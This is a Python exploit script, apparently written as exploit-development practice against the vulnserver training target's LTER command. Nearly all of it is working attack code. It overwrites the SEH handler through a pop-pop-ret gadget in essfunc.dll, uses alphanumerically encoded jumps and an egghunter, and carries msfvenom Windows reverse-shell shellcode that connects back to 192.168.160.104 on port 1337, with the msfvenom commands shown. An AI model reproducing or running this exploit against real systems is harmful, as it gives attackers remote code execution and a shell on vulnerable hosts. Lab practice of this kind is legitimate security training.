#!/usr/bin/python

import socket
import sys

host = "192.168.160.106"
port = 9999

#########################################
## WriTTen by: van6uard
## vulnserver LTER Exploit
## Log data, item 14
## Address=6250120B
## Message=  0x6250120b : pop ecx # pop ecx # ret  | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\van6uard\Desktop\vulnserver-master\essfunc.dll)

jump = "\x51\x58"
jump += "\x66\x05\x40\x12"
jump += "\x50\x5c"
jump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jump += "\x05\x13\x77\x61\x41" ## add  eax, 0x41617713
jump += "\x05\x12\x66\x62\x41" ## add  eax, 0x41626612
jump += "\x05\x12\x55\x41\x41" ## add  eax, 0x41415512
jump += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
jump += "\x50"                 ## push eax
jump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jump += "\x05\x33\x41\x61\x45" ## add  eax, 0x45614133
jump += "\x05\x33\x40\x60\x44" ## add  eax, 0x44604033
jump += "\x50"                 ## push eax

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.160.104 LPORT=1337 -f python -b "\x00" -v shellcode
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 11 compatible encoders
#Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
#x86/shikata_ga_nai succeeded with size 351 (iteration=0)
#x86/shikata_ga_nai chosen with final size 351
#Payload size: 351 bytes
#Final size of python file: 1900 bytes
shellcode =  ""
shellcode += "w00tw00t"
shellcode += "\xdd\xc1\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x52\xbd"
shellcode += "\xb2\xea\xc8\xdd\x83\xe8\xfc\x31\x68\x13\x03\xda"
shellcode += "\xf9\x2a\x28\xe6\x16\x28\xd3\x16\xe7\x4d\x5d\xf3"
shellcode += "\xd6\x4d\x39\x70\x48\x7e\x49\xd4\x65\xf5\x1f\xcc"
shellcode += "\xfe\x7b\x88\xe3\xb7\x36\xee\xca\x48\x6a\xd2\x4d"
shellcode += "\xcb\x71\x07\xad\xf2\xb9\x5a\xac\x33\xa7\x97\xfc"
shellcode += "\xec\xa3\x0a\x10\x98\xfe\x96\x9b\xd2\xef\x9e\x78"
shellcode += "\xa2\x0e\x8e\x2f\xb8\x48\x10\xce\x6d\xe1\x19\xc8"
shellcode += "\x72\xcc\xd0\x63\x40\xba\xe2\xa5\x98\x43\x48\x88"
shellcode += "\x14\xb6\x90\xcd\x93\x29\xe7\x27\xe0\xd4\xf0\xfc"
shellcode += "\x9a\x02\x74\xe6\x3d\xc0\x2e\xc2\xbc\x05\xa8\x81"
shellcode += "\xb3\xe2\xbe\xcd\xd7\xf5\x13\x66\xe3\x7e\x92\xa8"
shellcode += "\x65\xc4\xb1\x6c\x2d\x9e\xd8\x35\x8b\x71\xe4\x25"
shellcode += "\x74\x2d\x40\x2e\x99\x3a\xf9\x6d\xf6\x8f\x30\x8d"
shellcode += "\x06\x98\x43\xfe\x34\x07\xf8\x68\x75\xc0\x26\x6f"
shellcode += "\x7a\xfb\x9f\xff\x85\x04\xe0\xd6\x41\x50\xb0\x40"
shellcode += "\x63\xd9\x5b\x90\x8c\x0c\xcb\xc0\x22\xff\xac\xb0"
shellcode += "\x82\xaf\x44\xda\x0c\x8f\x75\xe5\xc6\xb8\x1c\x1c"
shellcode += "\x81\x06\x48\xbe\x39\xef\x8b\xbe\xbc\xd6\x02\x58"
shellcode += "\xd4\x38\x43\xf3\x41\xa0\xce\x8f\xf0\x2d\xc5\xea"
shellcode += "\x33\xa5\xea\x0b\xfd\x4e\x86\x1f\x6a\xbf\xdd\x7d"
shellcode += "\x3d\xc0\xcb\xe9\xa1\x53\x90\xe9\xac\x4f\x0f\xbe"
shellcode += "\xf9\xbe\x46\x2a\x14\x98\xf0\x48\xe5\x7c\x3a\xc8"
shellcode += "\x32\xbd\xc5\xd1\xb7\xf9\xe1\xc1\x01\x01\xae\xb5"
shellcode += "\xdd\x54\x78\x63\x98\x0e\xca\xdd\x72\xfc\x84\x89"
shellcode += "\x03\xce\x16\xcf\x0b\x1b\xe1\x2f\xbd\xf2\xb4\x50"
shellcode += "\x72\x93\x30\x29\x6e\x03\xbe\xe0\x2a\x33\xf5\xa8"
shellcode += "\x1b\xdc\x50\x39\x1e\x81\x62\x94\x5d\xbc\xe0\x1c"
shellcode += "\x1e\x3b\xf8\x55\x1b\x07\xbe\x86\x51\x18\x2b\xa8"
shellcode += "\xc6\x19\x7e"


# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.160.104 LPORT=1337 -f raw EXITFUNC=thread > revshell.bin
# ./alpha2 ecx --uppercase < revshell.bin
egghunter = "IIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJI3VK18JKODOG2PRBJS2F8XM6NWLUUQJ2TJOOH2WP06P44MYXWNO45JJNOCEM7KOZGA"

# plop shellcode first, then point a register to it. then egghunter after and align esp after 
buf = 'LTER /.:/' 
buf += egghunter
buf += 'A'*(3515-82-len(egghunter))
buf += jump
buf += 'B'*(82-len(jump))
buf += '\x77\x08\x76\x06'           # nSEH
buf += '\x0b\x12\x50\x62'           # SEH, pop pop retn
buf += '\x41'*2
buf += '\x54\x58'                   # push esp; push eax
buf += '\x66\x05\x50\x13'           # align ESP to correct address
buf += '\x50\x5c'                   # push eax; pop esp
buf += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
buf += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
buf += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
buf += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
buf += "\x50"                 ## push eax
buf += 'B'*(4200-3515-4-4-2-4-2)
buf += '\x00\x00'


try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #tcp socket
    s.connect((host, port))
    s.send(shellcode)
    print s.recv(1024)
    print "[+] Evil 1st stage shellcode sent..."
    s.close()

    c = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #tcp socket
    c.connect((host, port))
    c.send(buf + '\r\n')
    print "[+] Evil buffer sent"
    c.close()

except:
    print "[-] Can't send evil buffer"
    sys.exit()
